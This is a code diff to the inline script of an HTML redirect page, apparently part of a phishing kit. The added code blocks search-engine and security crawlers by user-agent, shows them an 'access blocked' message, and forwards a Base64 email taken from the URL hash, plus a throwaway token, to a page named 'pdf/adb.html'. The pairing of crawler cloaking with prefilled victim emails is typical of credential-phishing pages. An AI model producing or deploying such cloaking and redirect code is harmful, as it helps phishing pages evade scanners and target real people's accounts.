@@ -59,56 +59,38 @@
 
   <script>
     (function () {
-      function generateSecureToken(length = 64) {
-        const array = new Uint8Array(length / 2);
-        window.crypto.getRandomValues(array);
-        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+      // Bot detection
+      function isBotUserAgent() {
+        const bots = [
+          /bot/i, /crawler/i, /spider/i, /crawling/i,
+          /google/i, /bing/i, /yahoo/i, /facebook/i,
+          /duckduckgo/i, /baidu/i, /yandex/i
+        ];
+        return bots.some(bot => bot.test(navigator.userAgent));
       }
 
-      function encodeData(data) {
-        return btoa(encodeURIComponent(data))
-          .replace(/\+/g, '-')
-          .replace(/\//g, '_')
-          .replace(/=+$/, '');
+      if (isBotUserAgent()) {
+        document.getElementById('status').textContent = "Access blocked: automated system detected.";
+        document.querySelector('.loader').style.display = "none";
+        return; // stop here
       }
 
-      // Get the Base64 email from the URL hash
-      const hash = window.location.hash.substring(1);
-      
-      // Decode the Base64 email to get the real email
-      let realEmail = "guest@example.com"; // default
-      
-      if (hash) {
-        try {
-          // Decode the Base64 email (URL-safe decoding)
-          const base64Email = hash.replace(/-/g, '+').replace(/_/g, '/');
-          realEmail = decodeURIComponent(atob(base64Email));
-        } catch (e) {
-          console.error("Error decoding email:", e);
-        }
-      }
+      // Step 1: Get the Base64 email from the current URL (after the #)
+      var encodedEmail = window.location.hash.substring(1); // removes the '#'
 
-      const token = generateSecureToken();
+      // Step 2: Generate a token (example: random string)
+      var token = Math.random().toString(36).substring(2, 12);
 
-      sessionStorage.setItem("redirect_email", realEmail);
-      sessionStorage.setItem("redirect_token", token);
+      // Step 3: Build the redirect URL
+      var redirectUrl = "pdf/adb.html#email=" + encodedEmail + "&token=" + token;
 
-      history.replaceState(null, "", window.location.pathname + window.location.search);
-
-      // Re-encode the real email for the final redirect
-      const encodedEmail = encodeData(realEmail);
-      const redirectUrl = `pdf/adb.html#email=${encodedEmail}&token=${token}`;
-
-      // Update status message
-      document.getElementById('status').textContent = `Redirecting: ${realEmail}`;
-
-      // Redirect after a brief delay
+      // Step 4: Update status and redirect
+      document.getElementById('status').textContent = "Redirecting...";
       setTimeout(() => {
         window.location.replace(redirectUrl);
-      }, 2000);
+      }, 1500);
 
     })();
   </script>
 </body>
-
 </html>
